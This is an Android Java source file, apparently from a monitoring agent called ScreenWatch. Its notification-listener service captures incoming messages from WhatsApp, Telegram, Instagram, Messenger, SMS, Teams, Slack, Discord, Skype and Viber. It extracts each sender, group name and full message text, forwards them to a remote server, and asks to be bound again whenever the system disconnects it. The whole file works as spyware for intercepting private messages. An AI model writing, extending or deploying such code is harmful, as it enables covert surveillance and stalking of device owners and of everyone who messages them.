package com.screenwatch.agent.service;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.screenwatch.agent.network.ScreenWatchClient;
import com.screenwatch.agent.data.NotificationData;

import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

/**
 * Serviço que escuta todas as notificações do dispositivo.
 * Captura mensagens de WhatsApp, Telegram e outros apps de mensagens.
 */
public class NotificationMonitorService extends NotificationListenerService {

    private static final String TAG = "ScreenWatch-NLS";

    // Pacotes de apps monitorados
    private static final Set<String> MONITORED_PACKAGES = new HashSet<>(Arrays.asList(
        "com.whatsapp",                    // WhatsApp
        "com.whatsapp.w4b",                // WhatsApp Business
        "org.telegram.messenger",          // Telegram
        "com.instagram.android",           // Instagram
        "com.facebook.orca",               // Messenger
        "com.facebook.mlite",              // Messenger Lite
        "com.google.android.apps.messaging", // Google Messages (SMS)
        "com.microsoft.teams",             // Microsoft Teams
        "com.slack",                        // Slack
        "com.discord",                      // Discord
        "com.skype.raider",                // Skype
        "com.viber.voip"                   // Viber
    ));

    // Nomes amigáveis dos apps
    private static final java.util.Map<String, String> APP_NAMES = new java.util.HashMap<>();
    static {
        APP_NAMES.put("com.whatsapp", "WhatsApp");
        APP_NAMES.put("com.whatsapp.w4b", "WhatsApp Business");
        APP_NAMES.put("org.telegram.messenger", "Telegram");
        APP_NAMES.put("com.instagram.android", "Instagram");
        APP_NAMES.put("com.facebook.orca", "Messenger");
        APP_NAMES.put("com.facebook.mlite", "Messenger Lite");
        APP_NAMES.put("com.google.android.apps.messaging", "SMS");
        APP_NAMES.put("com.microsoft.teams", "Teams");
        APP_NAMES.put("com.slack", "Slack");
        APP_NAMES.put("com.discord", "Discord");
        APP_NAMES.put("com.skype.raider", "Skype");
        APP_NAMES.put("com.viber.voip", "Viber");
    }

    private ScreenWatchClient client;
    private final SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "🔔 NotificationMonitorService criado");
        client = ScreenWatchClient.getInstance();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();

        // Filtra apenas apps monitorados
        if (!MONITORED_PACKAGES.contains(packageName)) {
            return;
        }

        try {
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;

            // Extrai informações da notificação
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            CharSequence textCs = extras.getCharSequence(Notification.EXTRA_TEXT);
            String text = textCs != null ? textCs.toString() : "";
            CharSequence bigTextCs = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
            String bigText = bigTextCs != null ? bigTextCs.toString() : "";
            CharSequence subTextCs = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
            String subText = subTextCs != null ? subTextCs.toString() : "";

            // Tenta extrair de MessagingStyle (Android 10+)
            // WhatsApp/Telegram usam MessagingStyle e o texto fica em EXTRA_MESSAGES
            String messagingText = "";
            Bundle[] messages = (Bundle[]) extras.getSerializable(Notification.EXTRA_MESSAGES);
            if (messages != null && messages.length > 0) {
                Bundle lastMsg = messages[messages.length - 1];
                CharSequence msgText = lastMsg.getCharSequence("text");
                if (msgText != null) {
                    messagingText = msgText.toString();
                }
                // Se title está vazio, tenta pegar do sender da última mensagem
                if (title.isEmpty()) {
                    CharSequence msgSender = lastMsg.getCharSequence("sender");
                    if (msgSender != null) {
                        title = msgSender.toString();
                    }
                }
            }

            // Ignora notificações de grupo do tipo "X novas mensagens"
            if ((notification.flags & Notification.FLAG_GROUP_SUMMARY) != 0) {
                return;
            }

            // Usa o texto mais completo disponível
            String messageText = !bigText.isEmpty() ? bigText : text;
            if (messageText.isEmpty() && !messagingText.isEmpty()) {
                messageText = messagingText;
            }

            // Ignora notificações sem conteúdo textual
            if (messageText.isEmpty()) {
                return;
            }

            // Determina o remetente e grupo
            String sender = title;
            String group = null;

            // Para WhatsApp/Telegram em grupos, o subText contém o nome do grupo
            if (!subText.isEmpty()) {
                group = title;    // O título é o grupo
                // Em grupos do WhatsApp, o texto começa com "Nome: mensagem"
                if (messageText.contains(": ")) {
                    int colonIdx = messageText.indexOf(": ");
                    sender = messageText.substring(0, colonIdx);
                    messageText = messageText.substring(colonIdx + 2);
                }
            }

            String appName = APP_NAMES.getOrDefault(packageName, packageName);
            String timestamp = dateFormat.format(new Date(sbn.getPostTime()));

            // Cria objeto de dados
            NotificationData data = new NotificationData(
                appName,
                packageName,
                sender,
                group,
                messageText,
                timestamp,
                sbn.getId()
            );

            Log.i(TAG, String.format("📩 [%s] %s%s: %s",
                appName,
                group != null ? group + " > " : "",
                sender,
                messageText.length() > 50 ? messageText.substring(0, 50) + "..." : messageText
            ));

            // Envia ao servidor
            if (client != null && client.isConnected()) {
                client.sendNotification(data);
            }

        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar notificação: " + e.getMessage(), e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Notificação removida (lida/dispensada) - podemos registrar isso também
        String packageName = sbn.getPackageName();
        if (MONITORED_PACKAGES.contains(packageName)) {
            Log.d(TAG, "Notificação removida de " + packageName);
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.i(TAG, "✅ Listener de notificações conectado ao sistema");
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.w(TAG, "⚠️ Listener de notificações desconectado - solicitando rebind");
        requestRebind(null);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "NotificationMonitorService destruído");
    }
}
